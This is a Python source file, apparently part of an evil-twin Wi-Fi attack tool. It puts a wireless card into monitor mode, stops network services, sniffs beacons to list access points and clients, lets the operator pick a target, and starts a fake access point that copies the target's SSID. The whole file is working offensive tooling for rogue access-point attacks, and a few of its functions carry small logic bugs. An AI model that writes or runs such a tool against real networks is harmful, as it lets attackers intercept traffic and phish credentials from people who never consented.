import os
import sys
import colorama
from colorama import Fore
import time
from datetime import datetime
from run import print_errors, print_header, print_regular, print_sub_header
import run
from string import Template
from scapy.all import *
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
import fakeAP

colorama.init()

def switch_to_monitor_mode(interface):
    os.system("sudo ip link set {0} down".format(interface))
    os.system("sudo iw {0} set monitor control".format(interface))
    os.system("sudo ip link set {0} up".format(interface))
    print(Fore.GREEN + "[+] Switched to monitor mode")

def switch_to_managed_mode(interface):
    os.system("sudo ip link set {0} down".format(interface))
    os.system("sudo iw {0} set type managed".format(interface))
    os.system("sudo ip link set {0} up".format(interface))
    print(Fore.GREEN + "[+] Switched to managed mode")


class Attack:

    ap_list = []
    client_list = []
    
    target_ap = "none" # the target AP as a tuple: [ssid, mac, channel]
    client_target = "none"
    wlan_interface = "none"
    fake_ap_interface = "none"

    def __init__(self) -> None:
        
        os.system("service NetworkManager stop")
        os.system("airmon-ng check kill")

        os.system("clear")

        print_sub_header("initing attack")

        print(Fore.RESET + "")

        iwconfig_output = os.popen('iwconfig').read()
        print(iwconfig_output)

        result = False
        while result == False:
            sniffer_w = input(Fore.YELLOW + "[*] Enter sniffer interface name: ")
            if sniffer_w in iwconfig_output:
                self.wlan_interface = sniffer_w
                result = True
            else:
                print_errors("{*] You entered an invalid name. Please try again.")

        result = False
        while result == False:
            sniffer_w = input(Fore.YELLOW + "[*] Enter fake ap interface name: ")
            if sniffer_w in iwconfig_output:
                self.fake_ap_interface = sniffer_w
                result = True
            else:
                print_errors("{*] You entered an invalid name. Please try again.")

        print(Fore.YELLOW + "[*] switching {} to monitor mode".format(self.wlan_interface))
        switch_to_monitor_mode(self.wlan_interface)

    def handle_network_packet(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            mac = pkt[Dot11].addr2.upper()
            if mac not in [x[1] for x in self.ap_list[0:]]:
                stats = pkt[Dot11Beacon].network_stats()
                channel = stats.get("channel")
                self.ap_list.append([ssid, mac, channel])
                print_regular(Fore.GREEN + '(+) Found new Access Point : SSID = {} , MAC = {}'.format(ssid, mac))

    def network_search(self, duration: int = 2):
        print(Fore.YELLOW + "[*] starting to sniff for networks")

        channel = 0
        for channel in range(1, 14):
            os.system("iwconfig " + self.wlan_interface + " channel " + str(channel))

            print(Fore.YELLOW + "[*] Sniffing channel {} for {} seconds...".format(channel, duration))
            sniff(timeout=duration, iface=self.wlan_interface, prn=self.handle_network_packet)
    
        print("\n[*] Wi-Fi Networks:")
        
        if len(self.ap_list) > 0:
            counter = 0
            for network in self.ap_list:
                print("\n[{}] SSID: ".format(counter) + network[0] + " mac: " + network[1])
                counter += 1
            while True:
                user_input = input(Fore.YELLOW + "\n[*] Please enter the index of the target network or Rescan: ")
                if user_input == "Rescan":
                    return self.network_search()
                elif int(user_input) in range(0, counter):
                    self.target_ap = self.ap_list[int(user_input)]
                    return self.target_ap
                else:
                    print(Fore.RED + "Invalid option. please choose a valid index")
        else:
            user_input = input(Fore.RED + "[!] No Networks were found, for rescan type \'Rescan\', to quit type \'quit\' \n")
            if user_input == "Rescan":
                return self.network_search()
            elif user_input == "quit":
                switch_to_managed_mode(self.wlan_interface)
                run.exit_and_cleanup(0, "goodbye")

    def client_search(self, AP, duration: int = 2):
        
        global ap_mac 
        ap_mac = AP[1]

        
        for channel in range(1, 14):
            os.system("iwconfig " + self.wlan_interface + " channel " + str(channel))

            print(Fore.YELLOW + "[*] Sniffing channel {} for {} seconds...".format(channel, duration))
            sniff(timeout=duration, iface=self.wlan_interface, prn=self.handle_client_packet)

        print("\nWi-Fi Clients:")
        counter = 0
        if len(self.client_list) > 0:
            for client in self.client_list:
                print("[{}] CLient mac = {}".format(counter, client))
                counter += 1          
        else:
            user_input = input(Fore.RED + "[!] No Clients were found, for rescan type \'Rescan\', to quit type \'quit\' \n")
            if user_input == "Rescan":
                return self.client_search()
            elif user_input == "quit":
                switch_to_managed_mode(self.wlan_interface)
                run.exit_and_cleanup(0, "goodbye")

        flag = True
        while True:
            user_input = input(Fore.YELLOW + "\n[*] Please enter the index of the target CLient or Rescan: ")
            if user_input == "Rescan":
                return self.client_search()
            elif int(user_input) in range(0, counter):
                self.client_target = self.client_list[int(user_input)]
                return self.client_target
            else:
                print(Fore.RED + "Invalid option. please choose a valid index")

    def handle_client_packet(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
                if pkt.addr1 not in self.client_list and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
                    self.client_list.append(pkt.addr1)
                    print_regular(Fore.GREEN + '(+) Found new Client : MAC = {}'.format(pkt.addr1))

    def create_fakeAP(self):
        if self.fake_ap_interface == "none" or self.target_ap == "none":
            print(Fore.RED + "please choose first the target AP and the fake AP interface name")
            run.exit_and_cleanup(0,"tryagain")
        print(Fore.YELLOW + "[*] Starting process of creating fake AP")
        fake_ap = fakeAP.fakeAP(self.fake_ap_interface, self.target_ap[0], self.wlan_interface)
    